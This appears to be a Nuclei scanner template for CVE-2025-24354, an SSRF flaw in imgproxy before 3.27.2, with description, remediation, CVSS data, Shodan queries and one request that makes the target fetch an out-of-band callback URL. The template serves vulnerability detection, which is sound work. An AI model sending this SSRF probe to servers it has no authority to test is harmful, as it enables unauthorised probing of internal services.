id: CVE-2025-24354

info:
  name: Imgproxy < 3.27.2 - Server-Side Request Forgery (SSRF)
  author: oksuzkayra
  severity: medium
  description: imgproxy is server for resizing, processing, and converting images. Imgproxy does not block the 0.0.0.0 address, even with IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES set to false. This can expose services on the local host. This vulnerability is fixed in 3.27.2.
  impact: |
    The vulnerability could allow attackers to perform Server-Side Request Forgery (SSRF) attacks against services listening on 0.0.0.0, potentially exposing services on the local host. This could lead to unauthorized access to internal services and potential information disclosure.
  remediation: |
    The vulnerability has been fixed in imgproxy version 3.27.2. The fix involves updating the source address verification to also check for unspecified IP addresses (0.0.0.0) using the ip.IsUnspecified() function in addition to the existing ip.IsLoopback() check.
  reference:
    - https://github.com/imgproxy/imgproxy/commit/3d4fed6842aa8930ec224d0ad75b0079b858e081
    - https://github.com/imgproxy/imgproxy/security/advisories/GHSA-j2hp-6m75-v4j4
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2025-24354
    cwe-id: CWE-918
    epss-score: 0.00029
    epss-percentile: 0.06843
    cpe: cpe:2.3:a:evilmartians:imgproxy:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: evilmartians
    product: imgproxy
    shodan-query:
      - "Server: imgproxy"
      - "server: imgproxy"
  tags: cve,cve2025,imgproxy,ssrf,oast,evilmartians

http:
  - method: GET
    path:
      - "{{BaseURL}}/unsafe/plain/http://{{interactsh-url}}"

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_protocol
        words:
          - "dns"